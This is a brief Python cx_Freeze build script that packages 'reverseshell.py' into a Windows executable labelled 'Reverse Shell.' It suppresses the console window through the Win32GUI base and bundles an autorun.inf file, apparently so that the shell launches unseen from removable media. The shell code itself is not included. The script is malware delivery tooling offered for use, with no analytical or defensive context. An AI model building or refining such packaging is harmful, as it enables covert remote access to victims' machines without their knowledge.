import sys
from cx_Freeze import Executable, setup

include = ['autorun.inf']
base = None

if sys.platform == 'win32':
	base = 'Win32GUI'

setup(name='Shell', version='1.0',
	description='Reverse Shell.',
	options={'build_exe': {'include_files': include}},
	executables=[Executable('reverseshell.py', base=base)])